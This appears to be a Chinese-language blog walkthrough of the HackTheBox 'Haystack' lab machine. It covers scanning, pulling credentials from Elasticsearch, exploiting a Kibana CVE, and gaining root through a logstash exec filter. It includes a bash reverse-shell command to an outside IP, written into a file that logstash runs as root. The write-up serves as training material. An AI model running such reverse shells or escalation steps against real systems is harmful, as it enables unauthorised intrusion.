@@ -1,0 +1,481 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic|Roboto Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"zanderchang.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta property="og:type" content="article">
+<meta property="og:title" content="hackthebox-Haystack">
+<meta property="og:url" content="http://zanderchang.github.io/2019/11/03/hackthebox-Haystack/index.html">
+<meta property="og:site_name" content="zh2的博客">
+<meta property="og:locale">
+<meta property="og:image" content="http://zanderchang.github.io/img/haystack/1.png">
+<meta property="og:image" content="http://zanderchang.github.io/img/haystack/needle.jpg">
+<meta property="og:image" content="http://zanderchang.github.io/img/haystack/2.png">
+<meta property="og:image" content="http://zanderchang.github.io/img/haystack/3.png">
+<meta property="og:image" content="http://zanderchang.github.io/img/haystack/4.png">
+<meta property="og:image" content="http://zanderchang.github.io/img/haystack/5.png">
+<meta property="article:published_time" content="2019-11-03T11:40:25.000Z">
+<meta property="article:modified_time" content="2021-03-21T12:13:40.481Z">
+<meta property="article:author" content="zh2">
+<meta property="article:tag" content="hackthebox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://zanderchang.github.io/img/haystack/1.png">
+
+<link rel="canonical" href="http://zanderchang.github.io/2019/11/03/hackthebox-Haystack/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-Hans'
+  };
+</script>
+
+  <title>hackthebox-Haystack | zh2的博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+<link rel="alternate" href="/atom.xml" title="zh2的博客" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">zh2的博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="http://zanderchang.github.io/2019/11/03/hackthebox-Haystack/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="zh2">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zh2的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          hackthebox-Haystack
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2019-11-03 19:40:25 19:40:25" itemprop="dateCreated datePublished" datetime="2019-11-03T19:40:25+08:00">2019-11-03 19:40:25</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-03-21 20:13:40 20:13:40" itemprop="dateModified" datetime="2021-03-21T20:13:40+08:00">2021-03-21 20:13:40</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/hackthebox/" itemprop="url" rel="index"><span itemprop="name">hackthebox</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><img src="/img/haystack/1.png" alt=""></p>
+<span id="more"></span>
+<ul>
+<li>使用<code>nmap</code>扫描到端口22、80、9200（ElasticSearch 6.4.2）</li>
+</ul>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh     OpenSSH <span class="number">7.4</span> (protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   <span class="number">2048</span> <span class="number">2</span>a:<span class="number">8</span>d:e2:<span class="number">92</span>:<span class="number">8</span>b:<span class="number">14</span>:b6:<span class="number">3</span>f:e4:<span class="number">2</span>f:<span class="number">3</span>a:<span class="number">47</span>:<span class="number">43</span>:<span class="number">23</span>:<span class="number">8</span>b:<span class="number">2</span><span class="built_in">b</span> (RSA)</span><br><span class="line">|   <span class="number">256</span> e7:<span class="number">5</span>a:<span class="number">3</span>a:<span class="number">97</span>:<span class="number">8</span>e:<span class="number">8</span>e:<span class="number">72</span>:<span class="number">87</span>:<span class="number">69</span>:a3:<span class="number">0</span>d:d1:<span class="number">00</span>:bc:<span class="number">1</span>f:<span class="number">09</span> (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">01</span>:d2:<span class="number">59</span>:b2:<span class="number">66</span>:<span class="number">0</span>a:<span class="number">97</span>:<span class="number">49</span>:<span class="number">20</span>:<span class="number">5</span>f:<span class="number">1</span>c:<span class="number">84</span>:eb:<span class="number">81</span>:<span class="keyword">ed</span>:<span class="number">95</span> (ED25519)</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http    nginx <span class="number">1.12</span><span class="number">.2</span></span><br><span class="line">|_http-server-<span class="built_in">header</span>: nginx/<span class="number">1.12</span><span class="number">.2</span></span><br><span class="line">|_http-<span class="built_in">title</span>: Site doesn&#x27;t have a <span class="built_in">title</span> (text/html).</span><br><span class="line"><span class="number">9200</span>/tcp <span class="keyword">open</span>  http    nginx <span class="number">1.12</span><span class="number">.2</span></span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: <span class="keyword">DELETE</span></span><br><span class="line">|_http-server-<span class="built_in">header</span>: nginx/<span class="number">1.12</span><span class="number">.2</span></span><br><span class="line">|_http-<span class="built_in">title</span>: Site doesn&#x27;t have a <span class="built_in">title</span> (application/json; charset=UTF<span class="number">-8</span>).</span><br></pre></td></tr></table></figure>
+<ul>
+<li>访问 <a target="_blank" rel="noopener" href="http://10.10.10.115">http://10.10.10.115</a> 得到图片needle.jpg，<code>Stegsolve</code>查看图片可见base64的提示，解码得西班牙语得提示</li>
+</ul>
+<p><img src="/img/haystack/needle.jpg" alt="needle"></p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">la</span> aguja <span class="keyword">en</span> <span class="keyword">el</span> pajar es <span class="string">&quot;clave&quot;</span></span><br><span class="line">the needle in the haystack <span class="keyword">is</span> <span class="string">&quot;key&quot;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>使用<a target="_blank" rel="noopener" href="https://github.com/taskrabbit/elasticsearch-dump"><code>elasticsearch-dump</code></a>获取9200的quotes数据，在数据中搜索可得到两个<code>base64</code>加密的数据（搜索<code>base64</code>得特征字符，比如<code>=</code>），分别为用户名和密码，解码为security和spanish.is.key</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">elasticdump --input=http://10.10.10.115:9200/quotes --output=quotes.json --<span class="built_in">type</span>=data</span><br></pre></td></tr></table></figure>
+<ul>
+<li>使用<code>ssh</code>登录获得user.txt</li>
+</ul>
+<p><img src="/img/haystack/2.png" alt=""></p>
+<ul>
+<li>使用<code>scp</code>上传<a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh"><code>LinEnum</code></a>获取目标机器信息，首先发现<code>logstash</code>以root权限运行，查看/etc/logstash/conf.d/的配置文件，发现其需要root或kibana权限才可以查看</li>
+</ul>
+<p><img src="/img/haystack/3.png" alt=""></p>
+<ul>
+<li>利用<a target="_blank" rel="noopener" href="https://github.com/mpgn/CVE-2018-17246">CVE-2018-17246</a>获取kibana的shell</li>
+</ul>
+<p><img src="/img/haystack/4.png" alt=""></p>
+<ul>
+<li>查看/etc/logstash/conf.d/的配置文件，发现<code>logstash</code>每10s读取/opt/kibana/logstash_*的内容并在过滤后执行，则<code>echo &quot;Ejecutar comando : bash -i &gt;&amp; /dev/tcp/10.10.14.52/22222 0&gt;&amp;1&quot; &gt; /opt/kibana/logstash_ert</code>（可自行搭建<code>kibana</code>，使用其<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/443f1ea7b640">grok调试器</a>测试过滤效果），等待一段时间获取返回的shell</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/logstash/conf.d/filter.conf</span><br><span class="line">filter &#123;</span><br><span class="line">	if [type] == &quot;execute&quot; &#123;</span><br><span class="line">		grok &#123;</span><br><span class="line">			match =&gt; &#123; &quot;message&quot; =&gt; &quot;Ejecutar\s*comando\s*:\s+%&#123;GREEDYDATA:comando&#125;&quot; &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cat /etc/logstash/conf.d/input.conf</span><br><span class="line">input &#123;</span><br><span class="line">	file &#123;</span><br><span class="line">		path =&gt; &quot;/opt/kibana/logstash_*&quot;</span><br><span class="line">		start_position =&gt; &quot;beginning&quot;</span><br><span class="line">		sincedb_path =&gt; &quot;/dev/null&quot;</span><br><span class="line">		stat_interval =&gt; &quot;10 second&quot;</span><br><span class="line">		type =&gt; &quot;execute&quot;</span><br><span class="line">		mode =&gt; &quot;read&quot;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cat /etc/logstash/conf.d/output.conf</span><br><span class="line">output &#123;</span><br><span class="line">	if [type] == &quot;execute&quot; &#123;</span><br><span class="line">		stdout &#123; codec =&gt; json &#125;</span><br><span class="line">		exec &#123;</span><br><span class="line">			command =&gt; &quot;%&#123;comando&#125; &amp;&quot;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>获得root.txt</li>
+</ul>
+<p><img src="/img/haystack/5.png" alt=""></p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>zh2
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://zanderchang.github.io/2019/11/03/hackthebox-Haystack/" title="hackthebox-Haystack">http://zanderchang.github.io/2019/11/03/hackthebox-Haystack/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/hackthebox/" rel="tag"># hackthebox</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2019/10/10/%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6%E7%9B%B8%E5%85%B3%E5%90%8D%E7%A7%B0%E6%90%9C%E9%9B%86/" rel="prev" title="安全软件相关名称搜集">
+      <i class="fa fa-chevron-left"></i> 安全软件相关名称搜集
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2019/11/03/hackthebox-Heist/" rel="next" title="hackthebox-Heist">
+      hackthebox-Heist <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">zh2</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">25</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">zh2</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
